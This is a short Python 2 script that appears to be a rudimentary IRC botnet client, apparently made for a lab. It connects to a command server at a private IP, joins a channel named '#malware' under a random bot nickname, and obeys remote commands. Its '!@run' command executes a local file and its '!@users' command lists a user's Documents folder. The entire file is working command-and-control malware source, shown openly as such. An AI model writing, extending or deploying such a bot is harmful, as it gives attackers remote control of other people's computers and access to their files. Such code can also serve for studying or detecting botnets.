import sys
import socket
import random
import os
import subprocess

def botName():
    values = list("123456789")
    L1=random.choice(values)
    L2=random.choice(values)
    L3=random.choice(values)
    L4=random.choice(values)

    name = "Bot"+ L1 + L2 + L3 + L4
    return name

server="192.168.1.30"
botnick=botName()
channel="#malware"

irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
irc.connect((server,6667))
irc.send("USER "+ botnick +" "+ botnick +" "+ botnick +" :r\r\n")
irc.send("NICK "+ botnick +"\n")
irc.send("JOIN "+ channel +"\n")

while 1:
     try:
         msg=irc.recv(2048)
         #print(msg)
     except Exception:
          pass
     if msg.find("PING")!=-1:
         irc.send("PRIVMSG "+channel+" :PONG!\r\n")
     if msg.find("!@PING")!=-1:
         irc.send("PRIVMSG "+channel+" :PONG!\r\n")
     if msg.lower().find("!@hi")!=-1:
         irc.send("PRIVMSG "+channel+" :Hello!\r\n")
     if msg.find("!@run")!=-1:
         subprocess.call(['C:\\test.txt'])
     if msg.find("!@users")!=-1:
         print os.listdir('C:\\Users\\malware\\Documents')
     # Limpio el msg
     msg=""
